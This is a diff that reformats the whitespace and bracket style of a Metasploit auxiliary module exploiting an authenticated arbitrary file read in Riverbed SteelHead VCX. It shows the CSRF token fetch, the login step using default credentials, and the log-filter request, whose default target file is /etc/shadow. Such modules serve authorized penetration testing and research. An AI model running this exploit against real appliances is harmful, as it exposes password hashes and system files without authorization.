@@ -10,37 +10,36 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Riverbed SteelHead VCX File Read',
-      'Description'    => %q{
+      'Name' => 'Riverbed SteelHead VCX File Read',
+      'Description' => %q{
           This module exploits an authenticated arbitrary file read in the log module's filter engine.
           SteelHead VCX (VCX255U) version 9.6.0a was confirmed as vulnerable.
       },
-      'References'     =>
-        [
-          ['EDB', '42101']
-        ],
-      'Author'         =>
-        [
-          'Gregory DRAPERI <gregory.draper_at_gmail.com>', # Exploit
-          'h00die' # Module
-        ],
+      'References' => [
+        ['EDB', '42101']
+      ],
+      'Author' => [
+        'Gregory DRAPERI <gregory.draper_at_gmail.com>', # Exploit
+        'h00die' # Module
+      ],
       'DisclosureDate' => 'Jun 01 2017',
-      'License'        =>  MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
-        OptString.new('FILE', [ true,  'Remote file to view', '/etc/shadow']),
+        OptString.new('FILE', [ true, 'Remote file to view', '/etc/shadow']),
         OptString.new('TARGETURI', [true, 'Vulnerable URI path', '/']),
         OptString.new('USERNAME', [true, 'Username', 'admin']),
         OptString.new('PASSWORD', [true, 'Password', 'password']),
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
     # pull our csrf
     res = send_request_cgi({
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),
+      'uri' => normalize_uri(datastore['TARGETURI'], 'login'),
       'method' => 'GET',
       'vars_get' => {
         'next' => '/'
@@ -58,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # authenticate
     res = send_request_cgi({
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),
+      'uri' => normalize_uri(datastore['TARGETURI'], 'login'),
       'method' => 'POST',
       'cookie' => cookie,
       'vars_post' => {
@@ -68,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
           'password' => datastore['PASSWORD'],
           'legalAccepted' => 'N/A',
           'userAgent' => ''
-          })
+        })
       }
     }, 25)
 
@@ -88,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # pull the file
     res = send_request_cgi({
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'modules/common/logs'),
+      'uri' => normalize_uri(datastore['TARGETURI'], 'modules/common/logs'),
       'method' => 'GET',
       'cookie' => cookie,
       'vars_get' => {
@@ -112,7 +111,7 @@ class MetasploitModule < Msf::Auxiliary
       # the file name.  It also, by default, includes other files, so we need to check we're on the right file.
       result['web3.model']['messages']['rows'].each do |row|
         if row['msg'].start_with?(datastore['FILE'])
-          reconstructed_file << row['msg'].gsub("#{datastore['FILE']}:",'').strip
+          reconstructed_file << row['msg'].gsub("#{datastore['FILE']}:", '').strip
         end
       end
       if reconstructed_file.any?
